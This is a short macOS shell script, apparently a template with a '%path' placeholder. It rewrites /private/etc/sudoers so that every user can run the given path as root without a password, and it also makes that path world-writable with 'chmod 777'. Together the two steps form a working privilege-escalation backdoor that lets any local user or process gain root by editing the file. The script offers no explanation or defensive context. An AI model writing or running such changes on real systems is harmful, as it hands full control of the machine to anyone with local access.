content=$(sudo cat /private/etc/sudoers)
if [[ $content == *"ALL    ALL = (root) NOPASSWD: %path"* ]]; then
  exit 8
fi
sudo su root -c 'chmod +w /private/etc/sudoers && echo "ALL    ALL = (root) NOPASSWD: %path\n$(cat /private/etc/sudoers)" > /private/etc/sudoers && chmod -w /private/etc/sudoers'
sudo chmod 777 %path
